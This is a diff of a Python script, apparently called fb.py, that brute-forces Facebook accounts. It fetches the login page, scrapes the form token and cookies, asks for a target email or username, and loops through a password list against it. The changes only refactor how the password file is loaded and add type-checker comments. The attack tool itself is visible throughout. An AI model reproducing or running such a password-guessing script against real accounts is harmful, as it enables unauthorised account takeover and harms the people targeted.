@@ -3,12 +3,13 @@ import requests
 from bs4 import BeautifulSoup
 import sys
 
+from PASSWORD_FILE import PASSWORD_FILE, password_data
+
 if sys.version_info[0] != 3:
     print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
     fb.py\n\t--------------------------------------''')
     sys.exit()
 
-PASSWORD_FILE = "passwords.txt"
 MIN_PASSWORD_LENGTH = 6
 POST_URL = 'https://www.facebook.com/login.php'
 HEADERS = {
@@ -24,10 +25,10 @@ def create_form():
 
     data = requests.get(POST_URL, headers=HEADERS)
     for i in data.cookies:
-        cookies[i.name] = i.value
+        cookies[i.name] = i.value # type: ignore
     data = BeautifulSoup(data.text, 'html.parser').form
-    if data.input['name'] == 'lsd':
-        form['lsd'] = data.input['value']
+    if data.input['name'] == 'lsd': # type: ignore
+        form['lsd'] = data.input['value'] # type: ignore
     return form, cookies
 
 
@@ -50,7 +51,6 @@ if __name__ == "__main__":
     if not os.path.isfile(PASSWORD_FILE):
         print("Password file is not exist: ", PASSWORD_FILE)
         sys.exit(0)
-    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
     print("Password file selected: ", PASSWORD_FILE)
     email = input('Enter Email/Username to target: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
